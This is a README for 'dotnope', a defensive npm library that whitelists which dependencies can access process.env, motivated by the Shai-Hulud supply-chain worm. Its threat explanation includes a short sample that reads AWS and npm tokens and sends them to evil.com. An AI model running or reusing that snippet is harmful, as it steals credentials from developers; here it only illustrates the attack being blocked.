# dotnope

Stop npm packages from stealing your secrets.

## The Problem

The [Shai-Hulud worm](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem) compromised 500+ npm packages and stole $50M+ in crypto by reading `AWS_SECRET_ACCESS_KEY`, `NPM_TOKEN`, and other credentials straight from `process.env`.

**Any package in your node_modules can read any environment variable. There's no permission system.**

dotnope fixes this.

## Quickstart

```bash
npm install dotnope
```

```javascript
// At the very top of your entry point
const dotnope = require('dotnope');
const handle = dotnope.enableStrictEnv();

// Store the token securely if you need to disable later
const token = handle.getToken();

// Your app code here...

// When done (optional):
handle.disable(token);
```

```json5
// package.json - whitelist what each package can access
{
  "environmentWhitelist": {
    "__options__": {
      "failClosed": true,
      "protectWrites": true,
      "protectDeletes": true,
      "protectEnumeration": true
    },
    "aws-sdk": {
      "allowed": ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_REGION"],
      "canWrite": [],
      "canDelete": [],
      "allowPeerDependencies": false
    },
    "dotenv": {
      "allowed": ["*"],
      "canWrite": ["*"],
      "canDelete": []
    }
  }
}
```

## What Happens

When a non-whitelisted package tries to read an env var:

```
dotnope: Unauthorized environment variable access!

  Package: "totally-legit-package"
  Attempted to read: "AWS_SECRET_ACCESS_KEY"
  Location: node_modules/totally-legit-package/index.js:47

To allow this access, add to your package.json:

  "environmentWhitelist": {
    "totally-legit-package": {
      "allowed": ["AWS_SECRET_ACCESS_KEY"]
    }
  }
```

## How This Stops Shai-Hulud

The attack worked by hiding credential-stealing code in postinstall scripts and runtime:

```javascript
// Inside compromised package
const aws = process.env.AWS_SECRET_ACCESS_KEY;  // Just works!
const npm = process.env.NPM_TOKEN;              // No restrictions!
fetch('https://evil.com/steal', { body: JSON.stringify({ aws, npm }) });
```

With dotnope enabled, that code throws immediately:

```
ERR_DOTNOPE_UNAUTHORIZED: "compromised-pkg" cannot read "AWS_SECRET_ACCESS_KEY"
```

The malware never gets your credentials. Your app crashes loudly instead of silently leaking secrets.

## Security Features

### Fail-Closed Mode (Default)
Unknown callers are blocked by default. If dotnope can't determine who's accessing `process.env`, it denies access rather than allowing it.

### Token-Protected Disable
The `disable()` function requires the secret token returned by `enableStrictEnv()`. Malicious packages can't just call `disableStrictEnv()` to bypass protection.

### Write Protection
Control which packages can write to `process.env`, preventing environment pollution attacks.

### Enumeration Protection
Packages can only see the env vars they're allowed to access when using `Object.keys(process.env)` or similar.

### Native Addon (Optional)
For high-security environments, dotnope includes an optional C++ native addon that provides:
- V8-level stack capture (immune to `Error.prepareStackTrace` manipulation)
- Async context tracking via V8 PromiseHooks
- Worker thread protection

Build the native addon with:
```bash
npm run build:native
```

## Config Options

### Global Options (`__options__`)

```json
{
  "environmentWhitelist": {
    "__options__": {
      "failClosed": true,
      "protectWrites": true,
      "protectDeletes": true,
      "protectEnumeration": true
    }
  }
}
```

| Option | Default | Description |
|--------|---------|-------------|
| `failClosed` | `true` | Block access when caller can't be determined |
| `protectWrites` | `true` | Enforce `canWrite` permissions |
| `protectDeletes` | `true` | Enforce `canDelete` permissions |
| `protectEnumeration` | `true` | Filter `Object.keys(process.env)` results |

### Per-Package Options

```json
{
  "environmentWhitelist": {
    "axios": {
      "allowed": ["HTTP_PROXY", "HTTPS_PROXY"],
      "canWrite": ["HTTP_PROXY"],
      "canDelete": [],
      "allowPeerDependencies": true
    }
  }
}
```

| Option | Default | Description |
|--------|---------|-------------|
| `allowed` | `[]` | Env vars the package can read (`["*"]` for all) |
| `canWrite` | `[]` | Env vars the package can write (`["*"]` for all) |
| `canDelete` | `[]` | Env vars the package can delete (`["*"]` for all) |
| `allowPeerDependencies` | `false` | Grant same permissions to dependencies |

## API

### `enableStrictEnv(options?)`

Enables environment variable protection. Returns a handle object.

```javascript
const handle = dotnope.enableStrictEnv({
    configPath: './package.json',    // Custom path to package.json
    suppressWarnings: false,         // Suppress security warnings
    verbose: false,                  // Show all warnings including info level
    allowInWorker: false,            // Required for worker threads
    workerConfig: null               // Config passed from main thread to workers
});
```

### Handle Object

```javascript
// Get the secret token (store securely!)
const token = handle.getToken();

// Disable protection (requires token)
handle.disable(token);

// Get access statistics
const stats = handle.getAccessStats();
// { "axios:HTTP_PROXY:read": 5, "dotenv:PORT:write": 2 }
```

### Utility Functions

```javascript
// Check if dotnope is currently enabled
dotnope.isEnabled();

// Check if LD_PRELOAD protection is active
dotnope.isPreloadActive();

// Emit security warnings (useful after enableStrictEnv)
dotnope.emitSecurityWarnings({ forceWarnings: true });

// Check if running in main thread (vs worker)
dotnope.isRunningInMainThread();

// Get serializable config for passing to workers
dotnope.getSerializableConfig();
```

## Example

See [examples/](./examples) for a working demo with a fake malicious package.

```bash
cd examples && node app.js
```

## Worker Thread Support

Worker threads require explicit opt-in for security:

```javascript
// Main thread
const dotnope = require('dotnope');
const handle = dotnope.enableStrictEnv();
const workerConfig = dotnope.getSerializableConfig();

// Pass config to worker via workerData
const worker = new Worker('./worker.js', { workerData: { config: workerConfig } });
```

```javascript
// worker.js
const { workerData } = require('worker_threads');
const dotnope = require('dotnope');

dotnope.enableStrictEnv({
    allowInWorker: true,
    workerConfig: workerData.config
});
```

## Advanced: LD_PRELOAD Protection

For protection against native C++ addons that call `getenv()` directly:

### Using dotnope-run CLI (Recommended)

```bash
npx dotnope-run node app.js
```

### Manual LD_PRELOAD

```bash
# Linux
LD_PRELOAD=/path/to/dotnope_preload.so node app.js

# macOS
DYLD_INSERT_LIBRARIES=/path/to/dotnope_preload.dylib node app.js
```

Build the preload library:
```bash
cd native/preload && make
```

## License

MIT
